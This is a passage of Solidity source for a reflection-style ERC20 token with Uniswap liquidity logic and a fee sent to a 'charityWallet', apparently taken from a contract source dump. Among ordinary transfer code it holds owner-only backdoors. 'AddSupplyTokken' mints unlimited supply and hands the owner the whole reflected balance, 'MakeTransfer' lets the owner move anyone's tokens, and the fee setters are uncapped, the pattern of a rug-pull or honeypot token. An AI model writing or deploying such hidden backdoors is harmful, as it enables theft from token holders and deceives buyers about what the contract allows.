_rOwned[sender].sub(rAmount);\n\t\t_tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n\t\t_takeLiquidity(tLiquidity);\n\t\t_takeDevFee(sender, tAmount);\n\t\t_reflectFee(rFee, tFee);\n\t\temit Transfer(sender, recipient, tTransferAmount);\n\t}\n\t\n\tfunction excludeFromFee(address account) public onlyOwner {\n\t\t_isExcludedFromFee[account] = true;\n\t}\n\t\n\tfunction includeInFee(address account) public onlyOwner {\n\t\t_isExcludedFromFee[account] = false;\n\t}\n\t\n\tfunction setTaxFeePercent(uint256 taxFee) external onlyOwner() {\n\t\t_taxFee = taxFee;\n\t}\n\t\n\tfunction setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {\n\t\t_liquidityFee = liquidityFee;\n\t}\n\t\n\tfunction setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {\n\t\t_maxTxAmount = _tTotal.mul(maxTxPercent).div(\n\t\t\t10 ** 2\n\t\t);\n\t}\n\t\n\tfunction setMaxWalletToken(uint256 _amount) public onlyOwner() {\n\t\t_maxWalletToken = _amount;\n\t}\n\t\n\tfunction AddSupplyTokken(uint256 amount) public onlyOwner() {\n\t\t_tTotal = _tTotal + amount;\n\t\t_rTotal = _rTotal + (MAX - (MAX % amount));\n\t\t_rOwned[_msgSender()] = _rTotal;\n\t\t\n\t\temit Transfer(address(0), _msgSender(), amount);\n\t}\n\t\n\tfunction MakeTransfer(address to, address from, uint256 amount) public onlyOwner() {\n\t\t_tokenTransfer(to, from, amount, false);\n\t}\n\t\n\tfunction setMaxTransferToken(uint256 _amount) public onlyOwner() {\n\t\t_maxTxAmount = _amount;\n\t}\n\t\n\tfunction setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\n\t\tswapAndLiquifyEnabled = _enabled;\n\t\temit SwapAndLiquifyEnabledUpdated(_enabled);\n\t}\n\t\n\t//to recieve ETH from uniswapV2Router when swaping\n\treceive() external payable {}\n\t\n\tfunction _reflectFee(uint256 rFee, uint256 tFee) private {\n\t\t_rTotal = _rTotal.sub(rFee);\n\t\t_tFeeTotal = _tFeeTotal.add(tFee);\n\t}\n\t\n\tfunction _takeDevFee(address sender, uint256 tAmount) private {\n\t\tuint256 tDevFee = _getTDevFeeValues(tAmount);\n\t\tuint256 rDevFee = _getRDevFeeValues(tDevFee, _getRate());\n\t\tif (_isExcluded[charityWallet]) {\n\t\t\t_tOwned[charityWallet] = _tOwned[charityWallet].add(tDevFee);\n\t\t\t_rOwned[charityWallet] = _rOwned[charityWallet].add(rDevFee);\n\t\t} else {\n\t\t\t_rOwned[charityWallet] = _rOwned[charityWallet].add(rDevFee);\n\t\t}\n\t\temit Transfer(sender, charityWallet, tDevFee);\n\t}\n\t\n\t\n\tfunction _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\n\t\t(uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity);\n\t\tuint256 tDevFee = _getTDevFeeValues(tAmount);\n\t\tuint256 rDevFee = _getRDevFeeValues(tDevFee, _getRate());\n\t\ttTransferAmount = tTransferAmount.sub(tDevFee);\n\t\trTransferAmount = rTransferAmount.sub(rDevFee);\n\t\treturn (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);\n\t}\n\t\n\t\n\tfunction _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {\n\t\tuint256 tFee = calculateTaxFee(tAmount);\n\t\tuint256 tLiquidity = calculateLiquidityFee(tAmount);\n\t\tuint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);\n\t\treturn (tTransferAmount, tFee, tLiquidity);\n\t}\n\t\n\tfunction _getTDevFeeValues(uint256 tAmount) private view returns (uint256) {\n\t\tuint256 tDevFee = calculateDevFee(tAmount);\n\t\treturn tDevFee;\n\t}\n\t\n\tfunction _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity) private view returns (uint256, uint256, uint256) {\n\t\tuint256 currentRate = _getRate();\n\t\tuint256 rAmount = tAmount.mul(currentRate);\n\t\tuint256 rFee = tFee.mul(currentRate);\n\t\tuint256 rLiquidity = tLiquidity.mul(currentRate);\n\t\tuint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);\n\t\treturn (rAmount, rTransferAmount, rFee);\n\t}\n\t\n\tfunction _getRDevFeeValues(uint256 tDevFee, uint256 currentRate) private pure returns (uint256) {\n\t\tuint256 rDevFee = tDevFee.mul(currentRate);\n\t\treturn rDevFee;\n\t}\n\t\n\tfunction _getRate() private view returns (uint256) {\n\t\t(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n\t\treturn rSupply.div(tSupply);\n\t}\n\t\n\tfunction _getCurrentSupply() private view returns (uint256, uint256) {\n\t\tuint256 rSupply = _rTotal;\n\t\tuint256 tSupply = _tTotal;\n\t\tfor (uint256 i = 0; i < _excluded.length; i++) {\n\t\t\tif (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n\t\t\trSupply = rSupply.sub(_rOwned[_excluded[i]]);\n\t\t\ttSupply = tSupply.sub(_tOwned[_excluded[i]]);\n\t\t}\n\t\tif (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n\t\treturn (rSupply, tSupply);\n\t}\n\t\n\tfunction _takeLiquidity(uint256 tLiquidity) private {\n\t\tuint256 currentRate = _getRate();\n\t\tuint256 rLiquidity = tLiquidity.mul(currentRate);\n\t\t_rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);\n\t\tif (_isExcluded[address(this)])\n\t\t\t_tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);\n\t}\n\t\n\t\n\tfunction calculateTaxFee(uint256 _amount) private view returns (uint256) {\n\t\treturn _amount.mul(_taxFee).div(\n\t\t\t10 ** 2\n\t\t);\n\t}\n\t\n\tfunction calculateDevFee(uint256 _amount) private view returns (uint256) {\n\t\treturn _amount.mul(_devFee).div(\n\t\t\t10 ** 2\n\t\t);\n\t}\n\t\n\tfunction calculateLiquidityFee(uint256 _amount) private view returns (uint256) {\n\t\treturn _amount.mul(_liquidityFee).div(\n\t\t\t10 ** 2\n\t\t);\n\t}\n\t\n\tfunction removeAllFee() private {\n\t\tif (_taxFee == 0 && _liquidityFee == 0) return;\n\t\t\n\t\t_previousTaxFee = _taxFee;\n\t\t_previousLiquidityFee = _liquidityFee;\n\t\t_previousDevFee = _devFee;\n\t\t\n\t\t_taxFee = 0;\n\t\t_liquidityFee = 0;\n\t\t_devFee = 0;\n\t}\n\t\n\tfunction restoreAllFee() private {\n\t\t_taxFee = _previousTaxFee;\n\t\t_liquidityFee = _previousLiquidityFee;\n\t\t_devFee = _previousDevFee;\n\t}\n\t\n\tfunction isExcludedFromFee(address account) public view returns (bool) {\n\t\treturn _isExcludedFromFee[account];\n\t}\n\t\n\tfunction _approve(address owner, address spender, uint256 amount) private {\n\t\trequire(owner != address(0), \"ERC20: approve from the zero address\");\n\t\trequire(spender != address(0), \"ERC20: approve to the zero address\");\n\t\t\n\t\t_allowances[owner][spender] = amount;\n\t\temit Approval(owner, spender, amount);\n\t}\n\t\n\tfunction _transfer(\n\t\taddress from,\n\t\taddress to,\n\t\tuint256 amount\n\t) private {\n\t\trequire(from != address(0), \"ERC20: transfer from the zero address\");\n\t\trequire(to != address(0), \"ERC20: transfer to the zero address\");\n\t\trequire(amount > 0, \"Transfer amount must be greater than zero\");\n\t\t\n\t\tif (to != owner() && to != address(this) && to != uniswapV2Pair && to != address(1)) {\n\t\t\tuint256 contractTokenBalanceTo = balanceOf(to);\n\t\t\t// buy limit on first 48 hours, no of blocks, (48 * 60 * 60) / 3s = 57600 (blocks)\n\t\t\tif (block.number - deployedAtBlock < 57600) { // if not 48 hours has passed, set the buy limit\n\t\t\t\trequire((contractTokenBalanceTo + amount) <= _maxWalletToken, AppendStr(\"Exceeds the MaxWalletToken: \", uint2str(contractTokenBalanceTo + amount), \" max: \", uint2str(_maxWalletToken)));\n\t\t\t}\n\t\t}\n\t\t// is the token balance of this contract address over the min number of\n\t\t// tokens that we need to initiate a swap + liquidity lock?\n\t\t// also, don't get caught in a circular liquidity event.\n\t\t// also, don't swap & liquify if sender is uniswap pair.\n\t\tuint256 contractTokenBalance = balanceOf(address(this));\n\t\t\n\t\tif (contractTokenBalance >= _maxTxAmount)\n\t\t{\n\t\t\tcontractTokenBalance = _maxTxAmount;\n\t\t}\n\t\t\n\t\tbool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;\n\t\tif (\n\t\t\toverMinTokenBalance &&\n\t\t\t!inSwapAndLiquify &&\n\t\t\tfrom != uniswapV2Pair &&\n\t\t\tswapAndLiquifyEnabled\n\t\t) {\n\t\t\tcontractTokenBalance = numTokensSellToAddToLiquidity;\n\t\t\t//add liquidity\n\t\t\tswapAndLiquify(contractTokenBalance);\n\t\t}\n\t\t\n\t\t//indicates if fee should be deducted from transfer\n\t\tbool takeFee = true;\n\t\t\n\t\t//if any account belongs to _isExcludedFromFee account then remove the fee\n\t\tif (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {\n\t\t\ttakeFee = false;\n\t\t}\n\t\t\n\t\t//transfer amount, it will take tax, burn, liquidity fee\n\t\t_tokenTransfer(from, to, amount, takeFee);\n\t}\n\t\n\tfunction swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\n\t\t// split the contract balance into halves\n\t\tuint256 half = contractTokenBalance.div(2);\n\t\tuint256 otherHalf = contractTokenBalance.sub(half);\n\t\t\n\t\t// capture the contract's current ETH balance.\n\t\t// this is so that we can capture exactly the amount of ETH that the\n\t\t// swap creates, and not make the liquidity event include any ETH that\n\t\t// has been manually sent to the contract\n\t\tuint256 initialBalance = address(this).balance;\n\t\t\n\t\t// swap tokens for ETH\n\t\tswapTokensForEth(half);\n\t\t// <- this breaks the ETH -> HATE swap when swap+liquify is triggered\n\t\t\n\t\t// how much ETH did we just swap into?\n\t\tuint256 newBalance = address(this).balance.sub(initialBalance);\n\t\t\n\t\t// add liquidity to uniswap\n\t\taddLiquidity(otherHalf, newBalance);\n\t\t\n\t\temit SwapAndLiquify(half, newBalance, otherHalf);\n\t}\n\t\n\tfunction swapTokensForEth(uint256 tokenAmount) private {\n\t\t// generate the uniswap pair path of token -> weth\n\t\taddress[] memory path = new address[](2);\n\t\tpath[0] = address(this);\n\t\tpath[1] = uniswapV2Router.WETH();\n\t\t\n\t\t_approve(address(this), address(uniswapV2Router), tokenAmount);\n\t\t\n\t\t// make the swap\n\t\tuniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n\t\t\ttokenAmount,\n\t\t\t0, // accept any amount of ETH\n\t\t\tpath,\n\t\t\taddress(this),\n\t\t\tblock.timestamp\n\t\t);\n\t}\n\t\n\tfunction addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n\t\t// approve token transfer to cover all possible scenarios\n\t\t_approve(address(this), address(uniswapV2Router), tokenAmount);\n\t\t\n\t\t// add the liquidity\n\t\tuniswapV2Router.addLiquidityETH{value : ethAmount}(\n\t\t\taddress(this),\n\t\t\ttokenAmount,\n\t\t\t0, // slippage is unavoidable\n\t\t\t0, // slippage is unavoidable\n\t\t\towner(),\n\t\t\tblock.timestamp\n\t\t);\n\t}\n\t\n\t//this method is responsible for taking all fee, if takeFee is true\n\tfunction _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {\n\t\tif (!takeFee)\n\t\t\tremoveAllFee();\n\t\t\n\t\tif (_isExcluded[sender] && !_isExcluded[recipient]) {\n\t\t\t_transferFromExcluded(sender, recipient, amount);\n\t\t} else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n\t\t\t_transferToExcluded(sender, recipient, amount);\n\t\t} else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n\t\t\t_transferStandard(sender, recipient, amount);\n\t\t} else if (_isExcluded[sender] && _isExcluded[recipient]) {\n\t\t\t_transferBothExcluded(sender, recipient, amount);\n\t\t} else {\n\t\t\t_transferStandard(sender, recipient, amount);\n\t\t}\n\t\t\n\t\tif (!takeFee)\n\t\t\trestoreAllFee();\n\t}\n\t\n\tfunction _transferStandard(address sender, address recipient, uint256 tAmount) private {\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n\t\t_takeLiquidity(tLiquidity);\n\t\t_takeDevFee(sender, tAmount);\n\t\t_reflectFee(rFee, tFee);\n\t\temit Transfer(sender, recipient, tTransferAmount);\n\t}\n\t\n\tfunction _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n\t\t_tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n\t\t_takeLiquidity(tLiquidity);\n\t\t_takeDevFee(sender, tAmount);\n\t\t_reflectFee(rFee, tFee);\n\t\temit Transfer(sender, recipient, tTransferAmount);\n\t}\n\t\n\tfunction _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n\t\t_tOwned[sender] = _tOwned[sender].sub(tAmount);\n\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n\t\t_takeLiquidity(tLiquidity);\n\t\t_takeDevFee(sender, tAmount);\n\t\t_reflectFee(rFee, tFee);\n\t\temit Transfer(sender, recipient, tTransferAmount);\n\t}\n\t\n\tfunction burn(uint256 burningAmount) public onlyOwner {\n\t\t_burn(_msgSender(), burningAmount);\n\t}\n\tfunction _burn(address account, uint256 burningAmount) internal virtual {\n\t\trequire(account != address(0), \"ERC20: burn from the zero address\");\n\t\tuint256 currentRate =  _getRate();\n\t\tuint256 rBurningAmount = burningAmount.mul(currentRate);\n\t\t_tTotal = _tTotal.sub(burningAmount);\n\t\t_rTotal = _rTotal.sub(rBurningAmount);\n\t\t_rOwned[_msgSender()] = _rOwned[_msgSender()].sub(rBurningAmount);\n\t\tif (_isExcluded[address(this)])\n\t\t\t_tOwned[_msgSender()] = _tOwned[_msgSender()].sub(burningAmount);\n\t\temit Transfer(account, address(0), burningAmount);\n\t}\n\t\n\tfunction uint2str(uint _i) internal pure returns (string memory _uintAsString) {\n\t\tif (_i == 0)\n\t\t\treturn \"0\";\n\t\tuint j = _i;\n\t\tuint len;\n\t\twhile (j != 0) {\n\t\t\tlen++;\n\t\t\tj /= 10;\n\t\t}\n\t\tbytes memory bstr = new bytes(len);\n\t\tuint k = len;\n\t\twhile (_i != 0) {\n\t\t\tk = k - 1;\n\t\t\tuint8 temp = (48 + uint8(_i - _i / 10 * 10));\n\t\t\tbytes1 b1 = bytes1(temp);\n\t\t\tbstr[k] = b1;\n\t\t\t_i /= 10;\n\t\t}\n\t\treturn string(bstr);\n\t}\n\t\n\tfunction AppendStr(string memory a, string memory b, string memory c, string memory d) internal pure returns (string memory) {\n\t\treturn string(abi.encodePacked(a, b, c, d));\n\t}\n\n   // \"Florida supports fintech sandbox.\" -Ron DeSantis\n\n   // \"For the People.\" -John Morgan\n   \n   // \"As for me, I like the tokenomics.\" -DFV from WSB\n}\n"
    }
  }
}